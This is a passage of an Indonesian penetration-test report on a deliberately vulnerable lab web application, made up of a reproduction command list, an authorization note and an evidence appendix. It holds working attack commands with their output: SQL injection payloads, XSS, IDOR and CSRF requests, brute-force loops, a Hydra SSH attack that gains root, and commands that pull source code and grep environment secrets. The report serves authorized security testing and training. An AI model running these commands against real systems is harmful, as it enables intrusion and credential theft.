curl -s -c /tmp/cj_indiv -o /dev/null -X POST http://192.168.1.18:3000/login -d "username=individu1&password=password123"

# 6 - IDOR (#4) dan XSS (#11)
curl -s -b /tmp/cj_indiv http://192.168.1.18:3000/api/perusahaan/2/data-keuangan
curl -s -b /tmp/cj_indiv "http://192.168.1.18:3000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep -o 'Hasil pencarian untuk:.*'

# 7 - ROLE ESCALATION (#3) dan CSRF (#10)
curl -s -o /dev/null -X POST http://192.168.1.18:3000/register -d "username=pwn_role_x&password=Pwn123&nama_lengkap=RolePwn&account_type=perusahaan"
curl -s -o /dev/null -X POST http://192.168.1.18:3000/register -H "Origin: http://evil.attacker.test" -d "username=csrf_from_evil&password=pwn&nama_lengkap=Victim&account_type=individu"

# 8 - RATE LIMIT (#6) dan ENUMERASI (#14)
for i in $(seq 1 40); do curl -s -o /dev/null -w "%{http_code} " -X POST http://192.168.1.18:3000/login -d "username=individu1&password=wrong$i"; done
curl -s -X POST http://192.168.1.18:3000/register -d "username=user_a&password=x&nama_lengkap=x&account_type=individu" | grep -o '<div class="error">.*</div>'

# 9 - SQLi (#1): jumlah kolom -> bypass -> dump creds -> dump skema
#    (lihat A.6; semuanya one-liner curl --data-urlencode)

# 10 - SESSION (#7): SID tetap / zombie / cookie flag / crack secret black-box
#     (lihat A.9, #7)

# 11 - UPLOAD (#5): semua ekstensi, stored XSS, traversal GAGAL
#     (lihat #5)

# 12 - /uploads/passwd LIVE (#12)
curl -s http://192.168.1.18:3000/uploads/passwd | head

# 13 - BRUTE FORCE MYSQL (#15)
#     (lihat A.7 — 40 kombinasi, labkeu_user/labkeu_pass ketemu)

# 14 - BRUTE FORCE SSH (#15) -> ROOT
hydra -L /tmp/users.txt -P /tmp/pass.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "id"

# 15 - VERIFIKASI SOURCE-SIDE (sekarang sudah root)
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app cat /usr/src/app/server.js /usr/src/app/routes/auth.js /usr/src/app/routes/dashboard.js /usr/src/app/db/db.js"
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "netstat -ltnp; id labkeu; ls -l /var/run/docker.sock; docker exec labkeu-app id"
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app npm audit; docker exec labkeu-app env | grep -iE 'secret|password'"

# 16 - PEMBERSIHAN ARTEFAK SENDIRI (jejak ITU SAJA; jejak lama dibiarkan untuk diobservasi)
mysql -h 192.168.1.18 -P 3307 -u labkeu_user -plabkeu_pass --skip-ssl labkeu -e "DELETE FROM dokumen WHERE nama_file IN ('forced_by_csrf.txt','trav_evil.txt','pwned.txt'); DELETE FROM users WHERE username IN ('zzz_not_exist_99999','pwn_role_1790577844','csrf_from_evil');"
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app rm -f /usr/src/app/public/uploads/forced_by_csrf.txt /usr/src/app/public/uploads/trav_evil.txt /usr/src/app/public/uploads/pwned.txt"
rm -f /tmp/cj_* /tmp/probe.* /tmp/csrffile.txt /tmp/trav.txt /tmp/users.txt /tmp/pass.txt /tmp/crack_secret.py
```

> **Catatan jejak.** Artefak yang saya buat sudah dihapus. Tapi artefak dari
> engagement **sebelumnya** sengaja saya biarkan agar bisa diobservasi dan
> dilaporkan sebagai temuan #12: akun `esc_audit`, `test_individu_$(date %s)`,
> `zzz_unique_18950`, `zzz_csrf_31965`, dan 22 baris `dokumen` (termasuk
> `passwd`, `shell.php`, `xss.html`) masih ada. **Rekomendasi: bersihkan
> sebelum cheloperational, atau biarkan untuk repeat-testing.**

---

# CATATAN OTORISASI

Seluruh pengujian dilakukan di **lab internal yang sengaja dibuat rentan**.
Dikonfirmasi langsung dari `/home/labkeu/lab-simulasi-gemati/README.md`:
*"HANYA untuk lab lokal/isolated, jangan pernah di-deploy ke internet"*, dan
*"Aplikasi ini untuk latihan menemukan, bukan contekan langsung"*. Data dan
instansi fiktif, **bukan** GEMATI/BBGTK asli.

Tidak ada data produksi tersentuh, tidak ada denial-of-service, tidak ada payload
merusak. Semua file uji dibuat dari konten dummy dan dihapus kembali.

---

## Lampiran — Bukti Visual

Dua belas screenshot asli, sama dengan Lampiran D di `laporan.md`.

Dua belas screenshot asli dari pengujian, tersimpan di `bukti-pentest/`. Nomor di kiri adalah jam penangkapan (WIB). Yang bertanda **belum terbukti** memang direkam tanpa output — sengaja dibiarkan apa adanya, bukan dihapus, supaya klaim yang tidak terbukti bisa dinilai sendiri oleh pembaca.

### [`ping.png`](bukti-pentest/ping.png) — Keterjangkauan host

**Jam 00:08 WIB.**

![Keterjangkauan host — ping.png](bukti-pentest/ping.png)

<details><summary>Isi yang direkam</summary>

```
64 bytes from 192.168.1.18: icmp_seq=1 ttl=64 time=10.5 ms
64 bytes from 192.168.1.18: icmp_seq=2 ttl=64 time=2.32 ms
64 bytes from 192.168.1.18: icmp_seq=3 ttl=64 time=1.95 ms
64 bytes from 192.168.1.18: icmp_seq=4 ttl=64 time=1.12 ms
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 1.115/3.966/10.472/3.781 ms
```

</details>

### [`scan-nmap.png`](bukti-pentest/scan-nmap.png) — Port dan versi layanan

**Jam 00:10 WIB.**

![Port dan versi layanan — scan-nmap.png](bukti-pentest/scan-nmap.png)

<details><summary>Isi yang direkam</summary>

```
22/tcp    open  ssh     OpenSSH 10.3 (protocol 2.0)
3000/tcp  open  http    Node.js Express framework
3307/tcp  open  mysql   MySQL 8.0.46
MAC Address: 08:00:27:81:9D:8D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

</details>

### [`2.png`](bukti-pentest/2.png) — Kredensial pada halaman publik

**Jam 00:44 WIB.**

![Kredensial pada halaman publik — 2.png](bukti-pentest/2.png)

> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.

<details><summary>Isi yang direkam</summary>

```
$ curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'
— TIDAK ADA OUTPUT TERCETAK —
```

</details>

### [`3.png`](bukti-pentest/3.png) — Login foothold

**Jam 00:44 WIB.**

![Login foothold — 3.png](bukti-pentest/3.png)

<details><summary>Isi yang direkam</summary>

```
$ curl -s -c /tmp/c ... -X POST http://192.168.1.18:3000/login -d username=individu1&password=REDACTED_STORED_PASSWORD
HTTP=302 -> http://192.168.1.18:3000/dashboard
```

</details>

### [`4.png`](bukti-pentest/4.png) — IDOR data keuangan lintas perusahaan

**Jam 00:44 WIB.**

![IDOR data keuangan lintas perusahaan — 4.png](bukti-pentest/4.png)

<details><summary>Isi yang direkam</summary>

```
$ curl -s -b /tmp/c http://192.168.1.18:3000/api/perusahaan/2/data-keuangan
[{"id":3,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"980000.00"},
 {"id":4,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement konsumsi kegiatan","nominal":"2150000.00"}]
```

</details>

### [`5.png`](bukti-pentest/5.png) — SQLi - penentuan jumlah kolom

**Jam 00:44 WIB.**

![SQLi - penentuan jumlah kolom — 5.png](bukti-pentest/5.png)

> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.

<details><summary>Isi yang direkam</summary>

```
$ curl -s -X POST .../login-noportal --data-urlencode "username=user_a' ORDER BY 7-- -" ...
— TIDAK ADA OUTPUT TERCETAK —
```

</details>

### [`6.png`](bukti-pentest/6.png) — SQLi - auth bypass

**Jam 00:45 WIB.**

![SQLi - auth bypass — 6.png](bukti-pentest/6.png)

> **Belum terbukti.** Baris `Masuk sebagai: BlackHat` tidak tercetak; yang terbukti hanya redirect 302.

<details><summary>Isi yang direkam</summary>

```
$ curl -s -c /tmp/s ... --data-urlencode "username=x' UNION SELECT 1,'hacker','x','perusahaan','BlackHat',1-- -"
HTTP=302 -> http://192.168.1.18:3000/dashboard
— Baris 'Masuk sebagai: BlackHat' TIDAK tercetak —
```

</details>

### [`7.png`](bukti-pentest/7.png) — SQLi - dump kredensial

**Jam 00:45 WIB.**

![SQLi - dump kredensial — 7.png](bukti-pentest/7.png)

> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.

<details><summary>Isi yang direkam</summary>

```
$ P="x' UNION SELECT 1,'p','x','perusahaan',(SELECT GROUP_CONCAT(...) FROM users),1-- -"
$ curl -s -c /tmp/d -o /dev/null -X POST .../login-noportal --data-urlencode username=$P ...
— TIDAK ADA OUTPUT TERCETAK; hasil dump tidak terbukti —
```

</details>

### [`8.png`](bukti-pentest/8.png) — Brute force MySQL port 3307

**Jam 00:46 WIB.**

![Brute force MySQL port 3307 — 8.png](bukti-pentest/8.png)

<details><summary>Isi yang direkam</summary>

```
$ for u in root labkeu_user labkeu admin; do for p in "" root REDACTED_WEAK_PASSWORD REDACTED_DB_PASSWORD REDACTED_STORED_PASSWORD REDACTED_DB_PASSWORD; ...
TEMUKAN: labkeu_user / REDACTED_DB_PASSWORD
```

</details>

### [`9.png`](bukti-pentest/9.png) — Dump penuh basis data

**Jam 00:47 WIB.**

![Dump penuh basis data — 9.png](bukti-pentest/9.png)

<details><summary>Isi yang direkam</summary>

```
| Tables_in_labkeu | data_keuangan, dokumen, perusahaan, users  (4 tabel)
| 1  | user_a     | REDACTED_STORED_PASSWORD | perusahaan | Admin CV Sinar Abadi | 1        |
| 2  | user_b     | REDACTED_STORED_PASSWORD | perusahaan | Admin PT Maju Bersama| 2        |
| 3  | individu1  | REDACTED_STORED_PASSWORD | individu   | Budi Santoso        | NULL     |
| 11 | test_individu_$(date %s) | REDACTED_TEST_PASSWORD | individu | Test Individu | NULL    |
| 13 | zzz_unique_18950 | REDACTED_TEST_PASSWORD | individu | Test | NULL |
| 14 | zzz_csrf_31965     | REDACTED_TEST_PASSWORD | individu | Test | NULL |
| 20 | esc_audit          | REDACTED_TEST_PASSWORD | perusahaan| Audit | NULL |
| data_keuangan: 4 baris, perusahaan_id 1 (2 baris) dan 2 (2 baris) |
```

</details>

### [`10.png`](bukti-pentest/10.png) — Brute force SSH dengan Hydra

**Jam 00:42 WIB.**

![Brute force SSH dengan Hydra — 10.png](bukti-pentest/10.png)

<details><summary>Isi yang direkam</summary>

```
$ printf 'root\nlabkeu\nadmin\nubuntu\n' > /tmp/u.txt
$ printf 'Labkeu\nREDACTED_DB_PASSWORD\npassword\nREDACTED_STORED_PASSWORD\nREDACTED_STORED_PASSWORD\ntoor\n' > /tmp/p.txt
$ hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
Hydra v9.7 starting at 2026-09-29 00:42:52
[DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (1:4/p:6)
[22][ssh] host: 192.168.1.18 login: root password: REDACTED_SSH_ROOT_PW
[STATUS] attack finished for 192.168.1.18 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
finished at 2026-09-29 00:42:54
```

</details>

### [`11.png`](bukti-pentest/11.png) — Akses root terkonfirmasi

**Jam 00:47 WIB.**

![Akses root terkonfirmasi — 11.png](bukti-pentest/11.png)

<details><summary>Isi yang direkam</summary>

```
$ sshpass -p 'REDACTED_SSH_ROOT_PW' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "id; uname -a; cat /etc/alpine-release"
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),...
Linux localhost 6.18.52-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-09-15 05:37:48 x86_64 Linux
3.24.2
```

</details>

